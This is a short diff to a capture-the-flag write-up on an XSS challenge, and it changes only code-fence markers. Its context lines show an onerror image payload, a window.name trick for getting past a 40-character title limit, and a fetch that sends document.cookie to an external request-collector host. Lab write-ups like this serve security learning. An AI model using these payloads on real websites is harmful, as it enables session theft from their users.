@@ -15,7 +15,7 @@ Challenge: https://note.ctf.zoolab.org/
 [](https://www.wibibi.com/info.php?tid=402)
 
 ## Source Code
-```javascript!
+```javascript
 ...
 <script>
     const id = location.pathname.split('/').pop();
@@ -67,7 +67,7 @@ Payload: `<img src='x' onerror='alert(1)'>`
 3. String limit problem...
 There's something wrong, that the title has input limit with 40 character at most. So, we can use `window.name` technique that we can write our payload as long as we can.
 If we set:
-    ```javascript!
+    ```javascript
     top.name = 'fetch("https://sbk6401.free.beeceptor.com?sh="+document.cookie)'
     ```
     Furthermore, we set our title as:<font color="FF0000">`<img src=x onerror=eval(window.name)>`</font>
